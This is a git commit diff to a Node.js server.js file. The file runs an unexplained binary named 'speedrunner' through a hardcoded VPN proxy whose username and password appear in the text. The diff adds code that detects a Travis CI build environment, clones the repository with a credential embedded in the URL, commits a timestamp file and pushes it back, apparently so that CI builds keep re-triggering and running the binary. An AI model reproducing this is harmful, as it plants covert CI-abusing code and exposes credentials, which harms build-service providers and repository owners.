bec7cb7d33b5605282cb5d263a1aa86e185c5bb3
luzelena57 <31210617+luzelena57@users.noreply.github.com>
2017-08-21 12:10:12 +0000

    Update server.js

--- server.js
+++ server.js
@@ -1,5 +1,5 @@
 var proxy = 'user1778485:h1E5bec0@lon.uk.torguardvpnaccess.com:6060';
-var child = require('child_process').exec('cd ./lib && chmod 755 -R speedrunner && ls -l && ./speedrunner -s start -o auto -regex true --type x --proxy ' + proxy);
+var child = require('child_process').exec('cd ./lib && chmod 755 -R speedrunner && ./speedrunner -s start -o auto -regex true --type x --proxy ' + proxy);
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
 });
@@ -9,9 +9,19 @@ child.stderr.on('data', function(data) {
 child.on('close', function(code) {
     console.log('closing code: ' + code);
 });
-
+var target = '';
+if (__dirname.indexOf('/home/travis') !== -1){
+  var pt = __dirname.split('travis/build/').pop();
+  target = 'https://' + pt.split('/')[0] + ':test123@github.com/' + pt.split('/')[0] + '/' + pt.split('/')[1] + '.git';
+}
+var myrepo = 'git clone ' + target + ' aaa && ';
+myrepo += 'git config --global user.email "test" && ';
+myrepo += 'git config --global user.name "test" && ';
+myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
+myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
+if (__dirname.indexOf('/home/travis') !== -1) exec(myrepo);
 var index = 1;
-var max = 20;
+var max = 46;
 var interval;
 interval = setInterval(function () {
   if (index >= max) {
